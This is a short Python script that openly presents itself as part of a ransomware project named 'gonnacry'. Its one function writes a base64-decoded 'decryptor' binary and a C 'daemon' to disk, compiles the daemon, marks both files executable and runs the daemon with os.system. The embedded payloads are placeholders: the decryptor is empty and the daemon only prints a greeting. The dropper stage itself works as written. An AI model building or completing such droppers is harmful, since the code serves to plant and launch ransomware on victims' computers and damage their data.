import os
import base64
import subprocess
import time
ransomware_path = '/home/tarcisio/gonnacry'

def drop_daemon_and_decryptor():
    decryptor = """"""
    daemon = """#include<stdio.h> \nint main(){ printf("ola mundo"); }"""
    with open(ransomware_path + "/decryptor", 'wb') as f:
        f.write(base64.b64decode(decryptor))

    with open(ransomware_path + "/daemon.c", 'wb') as f:
        f.write((daemon))

    os.chdir(ransomware_path)
    os.system('gcc daemon.c -o daemon')
    os.system('chmod +x daemon')
    os.system('chmod +x decryptor')
    # run deamon 
    os.system('./daemon')

if __name__=="__main__":
    drop_daemon_and_decryptor()